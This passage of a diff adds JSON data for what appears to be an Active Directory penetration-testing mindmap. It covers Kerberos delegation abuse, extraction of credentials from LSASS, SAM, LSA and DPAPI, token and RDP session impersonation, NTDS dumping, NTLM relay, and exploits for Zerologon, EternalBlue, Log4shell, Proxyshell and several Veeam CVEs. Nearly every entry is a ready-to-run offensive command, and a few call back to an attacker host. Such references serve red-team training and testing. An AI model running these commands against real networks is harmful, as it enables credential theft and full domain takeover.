+    },
+    {
+     "title": "Unconstrained delegation",
+     "flows": [
+      [
+       "Kerberos TGT"
+      ],
+      [
+       "PassTheTicket"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "UAC: ADS_UF_TRUSTED_FOR_DELEGATION",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "Force connection  with coerce",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": false,
+       "t": "Get tickets",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 3,
+       "cmd": true,
+       "t": "mimikatz privilege::debug sekurlsa::tickets /export sekurlsa::tickets /export",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 3,
+       "cmd": true,
+       "t": "Rubeus.exe dump /service:krbtgt /nowrap",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 3,
+       "cmd": true,
+       "t": "Rubeus.exe dump /luid:0xdeadbeef /nowrap",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 3,
+       "cmd": true,
+       "t": "Rubeus.exe monitor /interval:5",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Constrained delegation",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "With protocol transition (any) UAC: TRUST_TO_AUTH_FOR_DELEGATION",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "Get TGT for user",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": false,
+       "t": "Request S4u2self",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 3,
+       "cmd": false,
+       "t": "Request S4u2proxy",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "Rubeus.exe hash /password:<password>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "Rubeus.exe asktgt /user:<user> /domain:<domain> /aes256:<AES 256 hash>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 3,
+       "cmd": true,
+       "t": "Rubeus.exe s4u /ticket:<ticket> /impersonateuser:<admin_user> /msdsspn:<spn_constrained> /altservice:<altservice> /ptt",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 4,
+       "cmd": false,
+       "t": "Altservice HTTP/HOST/CIFS/LDAP",
+       "cve": false,
+       "flow": "Kerberos TGS"
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "getST.py -spn '<spn>/<target>' -impersonate Administrator -dc-ip '<dc_ip>' '<domain>/<user>:<password>' -altservice <altservice>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": false,
+       "t": "Altservice HTTP/HOST/CIFS/LDAP",
+       "cve": false,
+       "flow": "Kerberos TGS"
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Without protocol transition (kerberos only) UAC: TRUSTED_FOR_DELEGATION",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "Constrain between Y and Z",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": false,
+       "t": "Add computer X",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 3,
+       "cmd": false,
+       "t": "Add RBCD : delegate from X to Y",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 4,
+       "cmd": false,
+       "t": "s4u2self X (impersonate admin)",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 5,
+       "cmd": false,
+       "t": "S4u2Proxy X (impersonate admin on spn/Y)",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 6,
+       "cmd": false,
+       "t": "Forwardable TGS for Y",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 7,
+       "cmd": false,
+       "t": "S4u2Proxy Y (impersonate admin on spn/Z)",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "add computer account",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "addcomputer.py -computer-name '<computer_name>' -computer-pass '<ComputerPassword>' -dc-host <dc> -domain-netbios <domain_netbios> '<domain>/<user>:<password>'",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "RBCD With added computer account",
+       "cve": false,
+       "flow": "Kerberos TGS"
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "rbcd.py -delegate-from '<rbcd_con>$' -delegate-to '<constrained>$' -dc-ip '<dc>' -action 'write' -hashes '<hash>' <domain>/<constrained>$",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 3,
+       "cmd": true,
+       "t": "getST.py -spn host/<constrained> -impersonate Administrator --dc-ip <dc_ip> '<domain>/<rbcd_con>$:<rbcd_conpass>'",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 4,
+       "cmd": true,
+       "t": "getST.py -spn <constrained_spn>/<target> -hashes '<hash>' '<domain>/<constrained>$' -impersonate Administrator --dc-ip <dc_ip> -additional-ticket <previous_ticket>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "Self RBCD",
+       "cve": true,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": false,
+       "t": "Like RBCD without add computer",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Resource-Based Constrained Delegation",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "add computer account",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "addcomputer.py -computer-name '<computer_name>' -computer-pass '<ComputerPassword>' -dc-host <dc> -domain-netbios <domain_netbios> '<domain>/<user>:<password>'",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "RBCD With added computer account",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "Rubeus.exe hash /password:<computer_pass> /user:<computer> /domain:<domain>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "Rubeus.exe s4u /user:<fake_computer$> /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/<victim.domain.local> /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt`",
+       "cve": false,
+       "flow": "Admin"
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "rbcd.py -delegate-from '<computer>$' -delegate-to '<target>$' -dc-ip '<dc>' -action 'write' <domain>/<user>:<password>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "getST.py -spn host/<dc_fqdn> '<domain>/<computer_account>:<computer_pass>' -impersonate Administrator --dc-ip <dc_ip>`",
+       "cve": false,
+       "flow": "Kerberos TGT >>> Admin"
+      }
+     ]
+    },
+    {
+     "title": "S4U2self abuse",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Get machine account (X)'s TGT",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "Get a ST on X as user admin",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "getTGT.py -dc-ip \"<dc_ip>\" -hashes :\"<machine_hash>\" \"<domain>\"/\"<machine>$\"",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "getST.py -self -impersonate \"<admin>\" -altservice \"cifs/<machine>\" -k -no-pass -dc-ip \"DomainController\" \"<domain>\"/'<machine>$'`",
+       "cve": false,
+       "flow": "Admin"
+      }
+     ]
+    }
+   ]
+  },
+  "admin": {
+   "title": "Admin access",
+   "subjects": [
+    {
+     "title": "Extract credentials from LSASS.exe",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "LSASS as protected process",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "PPLdump64.exe <lsass.exe|lsass_pid> lsass.dmp #before 2022-07-22 update",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "mimikatz \"!+\" \"!processprotect /process:lsass.exe /remove\" \"privilege::debug\" \"token::elevate\"  \"sekurlsa::logonpasswords\" \"!processprotect  /process:lsass.exe\" \"!-\"",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Extract LSASS secrets",
+       "cve": false,
+       "flow": "User + Pass || NTLM || PassTheHash || Clear text move"
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "procdump.exe -accepteula -ma lsass.exe lsass.dmp",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "mimikatz \"privilege::debug\" \"token::elevate\" \"sekurlsa::logonpasswords\"  \"exit\"",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "msf> load kiwi creds_all",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "nxc smb <ip_range> -u <user> -p <password> -M lsassy",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "lsassy -d <domain> -u <user> -p <password> <ip>",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Extract credentials from SAM",
+     "flows": [
+      [
+       "NTLM",
+       "PassTheHash"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "nxc smb <ip_range> -u <user> -p <password> --sam",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "msf> hashdump",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "mimikatz \"privilege::debug\" \"lsadump::sam\" \"exit\"",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "secretsdump.py <domain>/<user>:<password>@<ip>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "reg save HKLM\\SAM <file>;  reg save HKLM\\SYSTEM <file>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "secretsdump.py -system SYSTEM -sam SAM LOCAL",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "reg.py <domain>/<user>:<password>@<ip> backup -o '\\\\<smb_ip>\\share'",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "secretsdump.py -system SYSTEM -sam SAM LOCAL",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "regsecrets.py <domain>/<user>:<password>@<ip>",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Extract credentials from LSA",
+     "flows": [
+      [
+       "MsCache 2",
+       "User + Pass"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "nxc smb <ip_range> -u <user> -p <password> --lsa",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "mimikatz \"privilege::debug\" \"lsadump::lsa\" \"exit\"",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "reg save HKLM\\SECURITY <file>;  reg save HKLM\\SYSTEM <file>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "secretsdump.py -system SYSTEM -security SECURITY",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "reg.py <domain>/<user>:<password>@<ip> backup -o '\\\\<smb_ip>\\share'",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Extract credentials from DPAPI",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "DPAPI",
+       "cve": false,
+       "flow": "User + Pass || PassTheHash || Clear text move"
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "nxc smb <ip_range> -u <user> -p <password> --dpapi [cookies] [nosystem]",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "donpapi <domain>/<user>:<password>@<target>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "dpapidump.py <domain>/<user>:<password>@<target>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "get masterkey",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "mimikatz \"sekurlsa::dpapi\"",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 3,
+       "cmd": true,
+       "t": "dploot.py browser -d <domain> -u <user> -p '<password>' <ip> -mkfile <masterkeys_file>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "lsassy -d <domain> -u <user> -p <password> <ip> -m rdrleakdiag -M masterkeys",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 3,
+       "cmd": true,
+       "t": "dploot.py browser -d <domain> -u <user> -p '<password>' <ip> -mkfile <masterkeys_file>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "SharpDPAPI.exe triage",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Crack users masterkey",
+       "cve": false,
+       "flow": "DPAPImk"
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "copy c:\\users\\<user>\\AppData\\Roaming\\Microsoft\\Protect\\<SID>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "DPAPImk2john.py --preferred <prefered_file>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 3,
+       "cmd": true,
+       "t": "DPAPImk2john.py -c domain -mk <masterkey> -S <sid>",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Impersonate",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Impersonate",
+       "cve": false,
+       "flow": "ACL || User + Pass"
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "msf> use incognito impersonate_token <domain>\\\\<user>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "nxc smb <ip> -u <localAdmin> -p <password> --loggedon-users",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "nxc smb <ip> -u <localAdmin> -p <password> -M schtask_as -o USER=<logged-on-user> CMD=<cmd-command>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "irs.exe list",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "irs.exe exec -p <pid> -c <command>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Impersonate with adcs",
+       "cve": false,
+       "flow": "NTLM || Pass The Hash / Ticket / Certificate"
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "masky - d <domain> -u <user>  (-p <password> || -k || -H <hash>) -ca <certificate authority> <ip>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Impersonate RDP Session",
+       "cve": false,
+       "flow": "RDP"
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "psexec.exe -s -i cmd",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "query user",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 3,
+       "cmd": true,
+       "t": "tscon.exe <id> /dest:<session_name>",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Misc",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Find Users",
+       "cve": false,
+       "flow": "Username"
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "smbmap.py --host-file ./computers.list -u <user> -p <password> -d <domain> -r 'C$\\Users' --dir-only --no-write-check --no-update --no-color --csv users_directory.csv",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Extract Keepass",
+       "cve": false,
+       "flow": "User + Pass"
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "KeePwn.py plugin add -u '<user>' -p '<password>' -d '<domain>' -t <target> --plugin KeeFarceRebornPlugin.dll",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "KeePwn.py trigger add -u '<user>' -p '<password>' -d '<domain>' -t <target>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Hybrid (Azure AD-Connect)",
+       "cve": false,
+       "flow": "DCSYNC"
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "Dump cleartext password of MSOL Account on ADConnect Server",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "azuread_decrypt_msol_v2.ps1",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "nxc smb <ip> -u <user> -p <password> -M msol",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    }
+   ]
+  },
+  "dom_admin": {
+   "title": "Domain admin",
+   "subjects": [
+    {
+     "title": "Dump ntds.dit",
+     "flows": [
+      [
+       "Lateral move",
+       "Crack hash"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "nxc smb <dcip> -u <user> -p <password> -d <domain> --ntds",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "secretsdump.py '<domain>/<user>:<pass>'@<ip>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "ntdsutil \"ac i ntds\" \"ifm\" \"create full c:\\temp\" q q",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "secretsdump.py -ntds ntds_file.dit -system SYSTEM_FILE -hashes lmhash:nthash LOCAL -outputfile ntlm-extract",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "msf> windows/gather/credentials/domain_hashdump",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "mimikatz lsadump::dcsync /domain:<target_domain> /user:<target_domain>\\administrator",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "certsync -u <user> -p '<password>' -d <domain> -dc-ip <dc_ip> -ns <name_server>",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Grab backup Keys",
+     "flows": [
+      [
+       "Credentials"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "donpapi collect - H ':<hash>' <domain>/<user>@<ip_range> -t ALL --fetch-pvk",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    }
+   ]
+  },
+  "low_hanging": {
+   "title": "Quick Compromise",
+   "subjects": [
+    {
+     "title": "\u26a0\ufe0f Zerologon (unsafe) CVE-2020-1472 @CVE@",
+     "flows": [
+      [
+       "Domain admin"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "zerologon-scan '<dc_netbios_name>' '<ip>'",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "cve-2020-1472-exploit.py <MACHINE_BIOS_NAME> <ip>",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Eternal Blue MS17-010 @CVE@",
+     "flows": [
+      [
+       "Admin",
+       "Low access"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "msf> exploit/windows/smb/ms17_010_eternalblue # SMBv1 only",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Tomcat/Jboss Manager",
+     "flows": [
+      [
+       "Admin",
+       "Low access"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "msf> auxiliary/scanner/http/tomcat_enum",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "msf> exploit/multi/http/tomcat_mgr_deploy",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Java RMI",
+     "flows": [
+      [
+       "Admin",
+       "Low access"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "msf> use exploit/multi/misc/java_rmi_server",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Java Serialiszed port",
+     "flows": [
+      [
+       "Admin",
+       "Low access"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "ysoserial.jar <gadget> '<cmd>' |nc <ip> <port>",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Log4shell",
+     "flows": [
+      [
+       "Admin",
+       "Low access"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "${jndi:ldap://<ip>:<port>/o=reference}",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Database",
+     "flows": [
+      [
+       "Admin",
+       "Low access"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "msf> use auxiliary/admin/mssql/mssql_enum_sql_logins",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Exchange",
+     "flows": [
+      [
+       "Admin"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Proxyshell",
+       "cve": true,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "proxyshell_rce.py -u https://<exchange> -e administrator@<domain>",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Veeam",
+     "flows": [
+      [
+       "User Account",
+       "Low access",
+       "Admin"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "CVE-2023-27532 (creds - Veeam backup)",
+       "cve": true,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "VeeamHax.exe --target <veeam_server>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "CVE-2023-27532 net.tcp:/<target>:<port>/",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "CVE-2024-29849 (auth bypass - Veeam Backup Enterprise Manager)",
+       "cve": true,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "CVE-2024-29849.py --target https://<veeam_ip>:<veeam_port>/ --callback-server <attacker_ip>:<port>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "CVE-2024-29855 (auth bypass - Veeam Recovery Orchestrator)",
+       "cve": true,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "CVE-2024-29855.py  --start_time <start_time_epoch> --end_time <end_time_epoch> --username <user>@<domain> --target https://<veeam_ip>:<veeam_port>/",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "CVE-2024-40711 (unserialize - Veeam backup)",
+       "cve": true,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "CVE-2024-40711.exe -f binaryformatter -g Veeam -c http://<attacker_ip>:8000/trigger --targetveeam <veeam_ip>",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "GLPI",
+     "flows": [
+      [
+       "Admin",
+       "Low access"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "CVE-2022-35914",
+       "cve": true,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "/vendor/htmlawed/htmlawed/htmLawedTest.php",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "CVE_2023_41320",
+       "cve": true,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "cve_2023_41320.py -u <user> -p <password> -t <ip>",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Weak websites / services",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "nuclei",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "nuclei -target <ip_range>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "nessus",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    }
+   ]
+  },
+  "mitm": {
+   "title": "Man In The Middle (Listen and Relay)",
+   "subjects": [
+    {
+     "title": "Listen",
+     "flows": [
+      [
+       "Hash NTLMv1 or NTLMv2",
+       "Username",
+       "Credentials (ldap/http)"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "responder -l <interface> #use --lm to force downgrade",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "smbclient.py",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "NTLM relay",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "MS08-068 self relay",
+       "cve": true,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "msf> exploit/windows/smb_smb_relay # windows 2000 / windows server 2008",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "SMB -> LDAP(S)",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "NTLMv1",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": false,
+       "t": "remove mic (no CVE needed)",
+       "cve": false,
+       "flow": "see LDAP(S)"
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "NTLMv2",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": false,
+       "t": "Remove mic (CVE-2019-1040)",
+       "cve": true,
+       "flow": "see LDAP(S)"
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "HTTP(S) -> LDAP(S)",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "Usually from webdav coerce",
+       "cve": false,
+       "flow": "see LDAP(S)"
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "To LDAP(S)",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "Relay to LDAP if LDAP signing and LDAPS channel binding not enforced (default)",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --add-computer <computer_name> <computer_password> --delegate-access `",
+       "cve": false,
+       "flow": "RBCD"
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --shadow-credentials --shadow-target '<dc_name$>'`",
+       "cve": false,
+       "flow": "Shadow Credentials"
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --escalate-user <user>`",
+       "cve": false,
+       "flow": "Domain admin"
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --interactive # connect to ldap_shell with nc 127.0.0.1 10111`",
+       "cve": false,
+       "flow": "LDAP SHELL"
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "To SMB",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "Relay to SMB (if SMB is not signed)",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": false,
+       "t": "Find SMB not signed targets (default if not a Domain controler)",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 3,
+       "cmd": true,
+       "t": "nxc smb <ip_range> --gen-relay-list smb_unsigned_ips.txt",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "ntlmrelayx.py -tf smb_unsigned_ips.txt -smb2support [--ipv6] -socks`",
+       "cve": false,
+       "flow": "SMB Socks"
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "To HTTP",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "Relay to CA web enrollement",
+       "cve": false,
+       "flow": "ESC8"
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "Relay to WSUS",
+       "cve": false,
+       "flow": "WSUS"
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "To MsSQL",
